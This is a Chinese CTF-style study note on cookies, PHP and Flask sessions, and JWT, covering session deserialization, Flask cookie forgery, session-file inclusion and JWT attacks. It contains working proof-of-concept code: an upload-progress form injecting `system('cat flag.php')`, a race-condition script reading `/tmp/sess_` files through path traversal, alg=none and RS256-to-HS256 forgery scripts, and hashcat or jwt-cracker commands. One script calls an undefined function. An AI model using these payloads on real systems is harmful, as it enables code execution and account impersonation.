# 前言

我是这么理解的，由于http是无状态的，需要cookie存储一些信息，相当与你去银行办业务说出你的姓名、电话、身份证号等，在web交互中这个过程相当于浏览器向服务器提交cookie，但是我能不能在银行办业务的时候说别人的姓名、电话呢？如果银行没有相应手段证伪的话大概是可以的，也就是你可以伪装成别人，给别人办卡，或者取走别人的钱。所以就需要银行也储存一些信息来确认，类似让你做人脸识别，最后身份证、户口本相当于token，他们是有加密和难以伪造的（除非你偷走别人的户口本，并且通过了银行的再验证）

# COOKIE

## OAuth

# session

参考<https://xz.aliyun.com/t/6640>

## 工作流程

> 工作流程
>
> （1）首先使用==session_start()==函数进行初始化，启动会话
>  
>  
>     - 读取名为PHPSESSID（默认）的cookie值，假使为abc123
>  
>        -> 若读取到PHPSESSID这个COOKIE，创建$_SESSION变量，并从相应的目录中（可以再php.ini中设置）读取SESS_abc123（默认是这  
>  
>        种命名方式）文件,将字符装在入$_SESSION变量中;
>  
>        - 如果发现请求的Cookie、Get、Post中不存在session
> id，PHP就会自动调用php_session_create_id函数创建一个新的会话，并且在
>  
>        http response中通过set-cookie头部发送给客户端保存，（有时候浏览器用户设置会禁止
> cookie，当在客户端cookie被禁用的情况下，php也可以自动将session
> id添加到url参数中以及form的hidden字段中，但这需要将php.ini中的session.use_trans_sid设为开启，也可以在运行时调用ini_set来设置这个配置项。）
>  
>
> 也会创建$_SESSION变量，同时创建一个sess_abc321(名称为随机值)的session文件,同时将abc321作为PHPSESSID的cookie值返回给浏览器
>  
>        端。
>
> （2）当执行PHP脚本时，通过使用$_SESSION变量注册session文件。  
>  （3）当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，
> 这个路径可以通过php.ini文件中的==session.save_path==指定，下次浏览网页时可以加载使用。

* * *

`抓包`

    
    
    <?php
    error_reporting(0);
    ini_set('session.serialize_handler','php_serialize');
    session_start();
    $_SESSION['session'] = $_GET['session'];
    ?>
    

![](./img/4808362004008595931.png)

可以看到新生成的sess存储文件

![](./img/7840596795426176920.png)

第二次再发包cookie里就带PHPSESSID了

![](./img/5625600963588386843.png)

![](./img/1351434516034881521.png)

* * *

![](./img/5171436412192886174.png)

可以看到session是==序列化存储==的，之前做过session反序列化的题

![](./img/6718381736306850131.png)

## trick

  * 在PHP配置中的默认情况下，Session是用==Session ID==来确定当前对话所对应的服务器Session，而Session ID是通过Cookie来传递的，禁用Cookie相当于失去了Session ID，也就得不到Session了

## 利用1：session反序列化

> 选择不同的处理器，处理方式也不一样，如果序列化和储存session与反序列化的方式不同，就有可能导致漏洞的产生。
>
> <https://github.com/80vul/phpcodz/blob/master/research/pch-013.md>
>
> 我之前一直不理解session是怎么影响到当前php脚本的，现在懂了一些，==当 PHP 停止的时候，它会自动读取 内存中`$_SESSION`
> 中的内容，并将其进行`序列化`，
> 然后发送给会话保存管理器来进行保存（持久化存储在硬盘上）。==也就是session被序列化的时候，那我猜session进行反序列化的时候就是用户传过来sessid并且确实存在这个会话id的时候，这个时候硬盘中的sess_文件内容会被反序列化取出到内存中，那么这里也能看出来==用户越多的时候对服务器的内存压力是越大的==。
>
> 那么这个漏洞的利用过程大概是：
>
> 一、题目ini配置满足session内容的自定义上传
> ，上传过程中存储在$_SESSION,结束后根据==php.ini中规定的处理器==进行持久化存储（因为当前并没有执行这个题目的php脚本）
>
> 二、存在session序列化处理器不同的漏洞
> ，发起会话读取这个题目的页面时，session会被从sess_文件中读取并根据==当前php脚本中ini_set规定的处理器==进行反序列化，这个时候正在被反序列化的字符串（我们构造的payload）刚好与当前执行的php脚本契合，那这个session存储的序列化内容就被反序列化执行了

默认情况下，PHP 使用内置的文件会话保存管理器来完成`session`的保存，也可以通过配置项 `session.save_handler`
来修改所要采用的会话保存管理器。 对于文件会话保存管理器，会将会话数据保存到配置项`session.save_path`所指定的位置。

PHP session在php.ini中有很多配置项，`PHP
session`的存储机制是由`session.serialize_handler`来定义引擎的，默认是以文件的方式存储，且存储的文件是由`sess_sessionid`来决定文件名的，当然这个文件名也不是不变的

* * *

`session.serialize_handler`定义的引擎有三种，如下表所示：

处理器名称 | 存储格式  
---|---  
php | 键名 + 竖线 + 经过`serialize()`函数序列化处理的值  
php_binary | 键名的长度对应的 ASCII 字符 + 键名 + 经过`serialize()`函数序列化处理的值  
php_serialize | 经过serialize()函数序列化处理的 **数组**  
  
  * php
    
        <?php
    error_reporting(0);
    ini_set('session.serialize_handler','php');
    session_start();
    $_SESSION['session'] = $_GET['session'];
    ?>
    

![](./img/8559312024715034403.png)

C|s:8:"flag.php";

  * php_binary
    
        <?php
    error_reporting(0);
    ini_set('session.serialize_handler','php_binary');
    session_start();
    $_SESSION['sessionsessionsessionsessionsession'] = $_GET['session'];
    ?>
    

`#`为键名长度对应的 ASCII
的值，`sessionsessionsessionsessionsessions`为键名，`s:7:"xianzhi";`为传入 GET
参数经过序列化后的值

  * php_serialize
    
        <?php
    error_reporting(0);
    ini_set('session.serialize_handler','php_serialize');
    session_start();
    $_SESSION['session'] = $_GET['session'];
    ?>
    

`a:1`表示`$_SESSION`数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值

![](./img/4459110068853845922.png)

`上传进度支持（session.upload_progress）`

> 当在php.ini中设置session.upload_progress.enabled =
> On的时候，PHP将能够跟踪上传单个文件的上传进度。当上传正在进行时，以及在将与session.upload_progress.name
> INI设置相同的名称的变量设置为POST时，上传进度将在$ _SESSION超全局中可用。

![](./img/200591510143970544.png)

`poc`

    
    
    <!DOCTYPE html>
    <html>
    <head>
        <title>A_dmin</title>
        <meta charset="utf-8">
    </head>
    <body>
        <form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
            <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
            <input type="file" name="file" />
            <input type="submit" value="submit" />
        </form>
    </body>
    </html>
    

抓包修改，在序列化的字符串前加 |，提交即可。

![](./img/4785015282524131462.png)

## 利用2：session伪造

这一块一直不咋熟悉，貌似在flask中session伪造比较多，学一下

>
> 并不是所有语言都有像php那样的的session存储机制，也不是任何情况下我们都可以向服务器写入文件。所以，很多Web框架都会另辟蹊径，比如Django默认将session存储在数据库中，而对于flask这里并不包含数据库操作的框架，就只能将session存储在cookie中。
>
> 因为cookie实际上是存储在客户端（浏览器）中的，所以称之为“客户端session”。

**flask** 的 **session** 机制：[flask
源码解析：session](http://cizixs.com/2017/03/08/flask-insight-session/)

客户端 **session** 问题：[客户端 session
导致的安全问题](https://www.leavesongs.com/PENETRATION/client-session-security.html)

flask仅对 **session** 进行了签名，按照flask对session的处理，如果我们拿不到secret_key也就无法伪造session

此外众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题，比如敏感信息泄露。

`flask解密脚本`

通过这个脚本解密处 **session** ，我们就可以大概知道 **session** 中存储着哪些基本信息。然后我们可以通过其他漏洞获取用于签名认证的
**secret_key** ，进而伪造任意用户身份，扩大攻击效果。

    
    
    #!/usr/bin/env python3
    import sys
    import zlib
    from base64 import b64decode
    from flask.sessions import session_json_serializer
    from itsdangerous import base64_decode
    
    
    def decryption(payload):
        payload, sig = payload.rsplit(b'.', 1)
        payload, timestamp = payload.rsplit(b'.', 1)
    
        decompress = False
        if payload.startswith(b'.'):
            payload = payload[1:]
            decompress = True
    
        try:
            payload = base64_decode(payload)
        except Exception as e:
            raise Exception('Could not base64 decode the payload because of '
                            'an exception')
    
        if decompress:
            try:
                payload = zlib.decompress(payload)
            except Exception as e:
                raise Exception('Could not zlib decompress the payload before '
                                'decoding the payload')
    
        return session_json_serializer.loads(payload)
    
    
    if __name__ == '__main__':
        print(decryption("eyJ1c2VybmFtZSI6eyIgYiI6IlozVmxjM1E9In19.XyZ3Vw.OcD3-l1yOcq8vlg8g4Ww3FxrhVs".encode()))
    

`flask加密脚本`

<https://github.com/noraj/flask-session-cookie-manager>

> 注意，编码一定需要加密的key的，需要去找这个key，可能在环境变量里面
>
> /proc/self  
>  // 其路径指向当前进程
>
> /environ  
>  // 记录当前进程的环境变量信息
>
> 当路径为`../../proc/self/environ`时，得到环境变量回显（这里存在任意文件读取）

  * `编码`

> python3 flask_session_cookie_manager3.py encode -s "woshicaiji" -t
> "{'username': b'admin'}"
>
> usage: flask_session_cookie_manager{2,3}.py encode [-h] -s <string> -t
> <string></string></string>
>
> optional arguments:  
>  -h, --help show this help message and exit  
>  -s <string>, --secret-key <string>  
>  Secret key  
>  -t <string>, --cookie-structure <string>  
>  Session cookie structure</string></string></string></string>

  * `解码`

> python3 ./flask_session_cookie_manager3.py decode -c
> ".eJw9kE2LwjAURf_K8NYuajqzEVwIsaXCS1FiQ7IRdWrz0ThDW6mN-N8nOODqLe7hXO57wOHS1b2GxdDd6hkczDcsHvBxggWg3afIi7u05wnJNjCSOZVnjuWVRt46DNpJIe-> KKqf4NjKSSK4Ns-> cRvYrcRjO6JyVtDYZiYl4GJJmJ1BxtcS8FkngnyXFUNjMql1_SrlImMJT0RaeRmLO8-FTcTcpiUvKdVnRN0FemzCPDWx37lvCcwbnvLofhx9XX9wTpN7YUqmWxUorKKrsakTdBBu2V2BhGK8dEnCiimq5TZldENsuXzvhjU79Nu-> SX7sf_5Hr0MYCh7geYwa2vu9fbYJ7A8w-kYW1v.Xj-tXQ.GmXzuYTP0IobbVCyI-9xVsc5C5A"
> -s ckj123
>
> usage: flask_session_cookie_manager{2,3}.py decode [-h] [-s <string>] -c
> <string></string></string>
>
> optional arguments:  
>  -h, --help show this help message and exit  
>  -s <string>, --secret-key <string>  
>  Secret key  
>  -c <string>, --cookie-value <string>  
>  Session cookie value</string></string></string></string>

`2018HCTF WEB admin(session伪造、unicode漏洞、条件竞争)`

<https://www.cnblogs.com/xhds/p/12287085.html>

## 利用3：session包含

**`php.ini有关session的重要配置项`**

>   * session.upload_progress.enabled = on
> 表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中
> ；
>
>   * session.upload_progress.prefix = "upload _progress_ " //将表示为session中的键名
>
>   * session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
> //当它出现在表单中，php将会报告上传进度，而且==它的值可控==！！！(shell内容)
>
>   * session.use_strict_mode = off
> //这个选项默认值为off，表示我们对==Cookie中sessionid可控==！！！(shell名字)
>
>   * session.save_path = /var/lib/php/sessions //session的存贮位置，默认还有一个 /tmp/目录
>
>

平常，当我们要创建session时往往会在php代码里写`session_start()`，但我们不写的话，也是可以创建的。

比如，在php.ini中设置`session.auto_start=On`
的情况下，php在接收请求的时候会自动初始化session，不需要执行`session_start()`。但默认状态下，这个选项是默认关闭的。

不过幸好，session还有一个默认选项，`session.use_strict_mode`默认值为0。

这样用户是可以自己定义session
ID的。比如，我们在cookie里设置PHPSESSID=MUNG29，就会在服务器`/tmp`目录下或者`/var/lib/php/sessions/`目录下创建一个文件：sess_MUNG29。即便没有设置自动初始化session，php也会产生session，并生成一个键值，这个键值由`ini.get("session.upload_progress.prefix")`+我们构造的`session.upload_progress.name`值组成，最后被一起写入sess_文件里。

>
> 如果没做过设置，session文件默认是在/var/lib/php/sessions/目录下，文件名是sess_加上你的sessionID字段。（没有权限）  
>
> 而一般情况下，phpmyadmin的session文件会设置在/tmp目录下，需要在php.ini里把session.auto_start置为1，把session.save_path目录设置为/tmp。
>
> 默认路径
>  
>  
>     /var/lib/php/sess_PHPSESSID
>     /var/lib/php/sessions/sess_PHPSESSID
>     /tmp/sess_PHPSESSID
>     /tmp/sessions/sess_PHPSESSID

POC

    
    
    <!DOCTYPE html>
    <html>
    <body>
    <form action="http://localhost/index.php" method="POST" enctype="multipart/form-data">
        <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php system('cat flag.php');?>" />
        <input type="file" name="file" />
        <input type="submit" value="submit" />
    </form>
    </body>
    </html>
    
    
    
    import io
    import sys
    import requests
    import threading
    sessid = 'mung29'
    
    def WRITE(session):
        while True:
            f = io.BytesIO(b'a' * 1024 * 50)
            session.post(
                'http://localhost/index.php',
                data={"PHP_SESSION_UPLOAD_PROGRESS":"<?php system('cat flag.php');?>"},
                files={"file":('1.txt', f)},
                cookies={'PHPSESSID':sessid}
            )
    
    def READ(session):
        while True:
            resp = session.get(f'http://localhost/index.php/?file=../../../../../../../../tmp/sess_{sessid}')
    
            if 'flag{' in resp.text:
                print(resp.text)
                sys.exit(0)
            else:
                print('Thinking[+++++++]')
    
    with requests.session() as session:
        t1 = threading.Thread(target=POST, args=(session, ))
        t1.daemon = True
        t1.start()
    
        READ(session)
    

# Token

## jwt

<http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html>

`JSON Web Token`由三部分组成，是目前最流行的跨域身份验证解决方案,它们之间用圆点(.)连接。这三部分分别是：

  * Header

> {  
>  "alg": "HS256",  
>  "typ": "JWT"  
>  }

  * Payload

  * Signature

> HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
>
> Base64 有三个字符`+`、`/`和`=`，在 URL 里面有特殊含义，所以要被替换掉：`=`被省略、`+`替换成`-`，`/`替换成`_`
> 。这就是 Base64URL 算法。

> `JWT与Session的异同`
>
> 相同点是，它们都是存储用户信息；然而，Session是在服务器端的，而JWT是在客户端的。
>
>
> Session方式存储用户信息的最大问题在于要==占用大量服务器内存==，增加服务器的开销,而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。
>
> Session的状态是存储在服务器端，客户端只有session id的cookie；但是如果是服务器集群，或者是跨域的服务导向架构，就要求
> session 数据共享，每台服务器都能够读取 session，一种解决方案是 session
> 数据持久化，写入数据库或别的持久层，缺点是工程量比较大，另外，持久层也有挂掉的风险，另一种方案是==服务器索性不保存 session
> 数据了，所有数据都保存在客户端==，每次请求都发回服务器。JWT 就是这种方案的一个代表。
>
> `JWT缺陷`
>
> JWT 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦
> JWT
> 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。（也就是说一个用户在手机A中登录了，然后又在手机B中登录，在过期之前手机A和B都可以登录，无法做到B登录后让A过期，如果要做到这点，就必须让服务器维护一个清单（记录该账号是否已经签发token），这样又回到session的老路了）
>
> JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT
> 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。
>
> 为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。

### 利用1：修改加密算法

  * `改为none`

用none算法生成的JWT==只有两部分==了，根本连签名都不存在。

JWT签名算法可确保JWT在传输过程中不会被恶意用户所篡改，但头部的alg字段可以改为none，若服务器支持签名算法为none，服务器会在JWT中删除相应的签名数据（这时，JWT就会只含有头部
+ ‘.’ + 有效载荷 + ‘.’），然后将其提交给服务器。

设定该功能的最初目的是为了方便调试。但是，若不在生产环境中关闭该功能，攻击者可以通过将 alg 字段设置为 “None” 来伪造他们想要的任何
token，接着便可以使用伪造的 token 冒充任意用户登陆网站。

**解密，我可以通过传入不存在的id，让secret为undefined,导致algorithm为none,然后就可以通过伪造jwt来成为admin**

`poc`

    
    
    #pip3 install pyjwt
    import jwt
    
    token = jwt.encode({"secretid":"","username":"admin","password":"123456","iat":1587367857},algorithm="none",key="").decode(encoding='utf-8')
    
    print(token)
    
    
    
    import jwt
    
    # payload
    token_dict = {
      "iss": "admin"
    }
    
    headers = {
      "alg": "none",
      "typ": "JWT"
    }
    jwt_token = jwt.encode(token_dict,          # payload, 有效载体
                           "",                  # 进行加密签名的密钥
                           algorithm="none",     # 指明签名算法方式, 默认也是HS256
                           headers=headers 
                           # json web token 数据结构包含两部分, payload(有效载体), headers(标头)
                           )
    
    print(jwt_token)
    

  * `修改RS256算法为HS256：` **（非对称密码算法= >对称密码算法）**

HS256算法使用密钥为所有消息进行签名和验证，而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。

如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。

如果它的公钥泄露的话，我们可以尝试将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。这样的话，后端代码使用RSA公钥+HS256算法进行签名验证。

`node脚本`

写这个js文件，然后执行 `node "xxx.js"`

    
    
    const jwt = require('jsonwebtoken');
    var fs = require('fs');
    var privateKey = fs.readFileSync('public.key');
    var token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'HS256' });
    console.log(token)
    

### 利用2：爆破密钥

如果HS256密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥，例如将密钥字符串用作PyJWT库示例代码中的密钥的时候，情况就是如此。

字典<https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt>

  * `c-jwt-cracker`

<https://github.com/brendan-rius/c-jwt-cracker>

这里用docker用法

> cd到安装目录执行docker build . -t jwtcrack
>
> 利用Docker来构建一个镜像并为该镜像命名为jwtcrack
>
>     * `docker build`: 这是Docker命令，用于构建一个镜像。
>     * `.`: 这表示当前目录，它告诉Docker在当前目录下查找Dockerfile文件，Dockerfile文件包含了构建镜像的指令。
>     * `-t jwtcrack`: 这是一个标签参数，用于为构建的镜像指定一个名称，这里我们将其命名为`jwtcrack`。

![](./img/4556990915880348053.png)

爆破

>     * `docker run`: 这是Docker命令，用于运行一个容器。
>     * `-it`: 这是两个参数的组合，`-i`表示交互式运行容器，`-t`表示为容器分配一个伪终端（pseudo-TTY）。
>     * `--rm`: 这是一个参数，表示容器退出后自动删除容器。这样可以在容器停止后清理资源，避免占用空间。
>     * `jwtcrack`: 这是之前构建的镜像的名称，用于指定要运行的容器的基础镜像。
>
> docker run -it --rm jwtcrack
> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMjgzODk1MiwiZXhwIjoxNjMyODQ2MTUyLCJuYmYiOjE2MzI4Mzg5NTIsInN1YiI6InVzZXIiLCJqdGkiOiI5M2QwODg0MTU5MzQ5MWJiMDc1NzZkNDI5NzFkODIyZSJ9.VlGkcoMcfvtRYv2kMczlfD8ns1hpN2pArD5PdrVgO6I

![](./img/5149722576207872582.png)

  * `hashcat`

参数

> -m 哈希类别
>
> -n 线程数
>
> -a 攻击模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。
>

>> ?d代表数字，可以换成小写字母?l，大写字母?u，特殊字符?s，大小写字母+特殊字符?a，–O表示最优化破解模式，可以加该参数，也可以不加该参数。

>>

>>
现在纯数字或者纯字母的密码是比较少见的，根据密码专家对泄漏密码的分析，90%的个人密码是字母和数字的组合，可以是自定义字符了来进行暴力破解，Hashcat支持4个自定义字符集，分别是
-1 -2 -3 -4。定义时只需要这样-2 ?l?d ，然后就可以在后面指定?2，?2表示小写字母和数字。这时候要破解一个8位混合的小写字母加数字：

>>

>> Hashcat.exe -a 3 --force -2 ?l?d hassh值或者hash文件 ?2?2?2?2?2?2?2?2

掩码

> hashcat -a 3 -m 16500
> eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.KQmLQ3oyd6NJkfAttkTl1PFR5fijDe3u-NUJJDgOPrA
> -1 1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM ?1?1?1?1?1

字典

> hashcat -m 16500
> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY2NzY1Njk0MiwiZXhwIjoxNjY3NjY0MTQyLCJuYmYiOjE2Njc2NTY5NDIsInN1YiI6InVzZXIiLCJqdGkiOiJkODMwMGU0MWJkZWI5Y2M1MjIzNzgxMDdkMDE2MzlhOCJ9.lYnVCfleYbtGCZMTtBlRHPn2b9AKLLa2qSe7ksQb53o
> -a 0 jwt-dicc.txt

